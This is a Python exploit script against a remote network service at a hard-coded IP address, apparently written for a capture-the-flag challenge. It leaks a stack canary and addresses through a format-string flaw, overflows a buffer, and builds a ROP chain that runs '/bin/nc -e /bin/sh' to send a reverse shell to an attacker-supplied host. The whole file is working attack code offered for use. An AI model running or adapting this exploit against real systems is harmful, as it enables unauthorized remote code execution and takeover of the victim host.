import socket
from struct import pack
import string

host = "88.87.208.163"
port = 7070

your_host = ""
your_host_port = 666

def get_int_by_index(s,index):
	while True:
		s.recv(1024)
		s.send("%"+str(index)+"$08X"+'\n')
		buf = s.recv(1024).__repr__()
		if len(buf)<24 or 'Congratul' in buf:
			continue
		if len(buf)<24:
			print('Unknown error!',len(buf), buf.__repr__())
		return int(buf[16:24],16)

def get_rop_chain_write_string_where(dst_addr,dst_max_size,st):
	st += '\x00'
	if len(st)%4 != 0:
		st += '\x00'*(4 - (len(st)%4))
	if len(st)>dst_max_size:
		raise Exception("Too big string!")
	p = ''
	for i in range(0,len(st),4):
		p += pack('<I', 0x08083fc6) # pop edx ; ret
		p += pack('<I', dst_addr+i) # @ .data
		p += pack('<I', 0x080CED61) # pop eax ; ret
		p += st[i:i+4]
		p += pack('<I', 0x0808a73d) # mov dword ptr [edx], eax ; ret
	return p	


index_retAddr = 74
index_stack = 73
index_socket = 71
index_canary = 70
 
gadget_syscall = 0x08061240
gadget_testMessage = 0x08048AC0

def exploit():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	s.settimeout(30)

	canary = get_int_by_index(s,index_canary)
	stack  = get_int_by_index(s,index_stack)
	sockId = get_int_by_index(s,index_socket)
	print('canary = '+hex(canary))
	print('stack = '+hex(stack))
	print('sockId = '+hex(sockId))
	s.recv(1024)


	buf = 'A'*256
	buf += pack("<I",canary)			#canary
	buf += 'A'*8
	buf += pack("<I",stack)				#stack


	p = buf

	#arg1
	p += get_rop_chain_write_string_where(0x080d50c0,0x10,'/bin/nc')

	#arg2
	p += get_rop_chain_write_string_where(0x080d50c0+0x10,0x10,'-e')
	
	#arg3
	p += get_rop_chain_write_string_where(0x080d50c0+0x20,0x10,'/bin/sh')

	#arg4
	p += get_rop_chain_write_string_where(0x080d50c0+0x30,0x10,your_host)

	#arg5
	p += get_rop_chain_write_string_where(0x080d50c0+0x40,0x10,str(your_host_port))



	# *(@.data+0x60) = ptr to arg1
	p += pack('<I', 0x08083fc6) # pop edx ; ret
	p += pack('<I', 0x080d50c0+0x60) # @ .data + 0x60
	p += pack('<I', 0x080CED61) # pop eax ; ret
	p += pack('<I', 0x080d50c0) # ptr to arg1
	p += pack('<I', 0x0808a73d) # mov dword ptr [edx], eax ; ret	
	# *(@.data+0x64) = ptr to arg2
	p += pack('<I', 0x08083fc6) # pop edx ; ret
	p += pack('<I', 0x080d50c0+0x64) # @ .data + 0x54
	p += pack('<I', 0x080CED61) # pop eax ; ret
	p += pack('<I', 0x080d50c0+0x10) # ptr to  arg2
	p += pack('<I', 0x0808a73d) # mov dword ptr [edx], eax ; ret	
	# *(@.data+0x68) = ptr to arg3
	p += pack('<I', 0x08083fc6) # pop edx ; ret
	p += pack('<I', 0x080d50c0+0x68) # @ .data + 0x68
	p += pack('<I', 0x080CED61) # pop eax ; ret
	p += pack('<I', 0x080d50c0+0x20) # ptr to arg3
	p += pack('<I', 0x0808a73d) # mov dword ptr [edx], eax ; ret
	# *(@.data+0x6c) = ptr to arg4
	p += pack('<I', 0x08083fc6) # pop edx ; ret
	p += pack('<I', 0x080d50c0+0x6c) # @ .data + 0x6c
	p += pack('<I', 0x080CED61) # pop eax ; ret
	p += pack('<I', 0x080d50c0+0x30) # ptr to arg3
	p += pack('<I', 0x0808a73d) # mov dword ptr [edx], eax ; ret
	# *(@.data+0x70) = ptr to arg5
	p += pack('<I', 0x08083fc6) # pop edx ; ret
	p += pack('<I', 0x080d50c0+0x70) # @ .data + 0x70
	p += pack('<I', 0x080CED61) # pop eax ; ret
	p += pack('<I', 0x080d50c0+0x40) # ptr to arg3
	p += pack('<I', 0x0808a73d) # mov dword ptr [edx], eax ; ret	
	# *(@.data+0x74) = 0
	p += pack('<I', 0x08083fc6) # pop edx ; ret
	p += pack('<I', 0x080d50c0+0x74) # @ .data + 0x74
	p += pack('<I', 0x080551c0) # xor eax, eax ; ret
	p += pack('<I', 0x0808a73d) # mov dword ptr [edx], eax ; ret


	#ebx = ptr to arg1
	p += pack('<I', 0x08048139) # pop ebx ; ret
	p += pack('<I', 0x080d50c0) # ptr to arg1

	#ecx = prt to ArgsArray
	p += pack('<I', 0x080499f5) # pop esi ; ret
	p += pack('<I', 0x080d50c0+0x74) # any addr such that dword ptr [addr] = 0x0
	p += pack('<I', 0x080CF077) # pop ecx ; or cl, byte ptr [esi] ; or al, 0x43 ; ret
	p += pack('<I', 0x080d50c0+0x60) # ptr to ArgsArray


	#edx = 0
	p += pack('<I', 0x08083fc6) # pop edx ; ret
	p += pack('<I', 0x0) # 0
	
	#mov eax,11
	p += pack('<I', 0x080551c0) # xor eax, eax ; ret
	p += pack('<I', 0x0806d6ff)*11 # inc eax ; ret
	#sys_call
	p += pack('<I', gadget_syscall) # int 0x80
	p += pack("<I", 0x08049924) # jmp $
	
	print('buffer length = '+str(len(p)))
	print('sending buffer!')
	
	if '\n' in p:
		print('BAD SYMBOL FOUND')
		print("position:",p.index('\n'))
		print(p[p.index('\n')::10].__repr__())
		exit(0)
	s.send(p+'\n')

	r_buf = s.recv(1024)
	print(r_buf)
	r_buf = s.recv(1024)
	print(r_buf)

	s.send('q\n')
	print(s.recv(1024))
	print(s.recv(1024))


	print(s.recv(1024))
	s.close()

exploit()
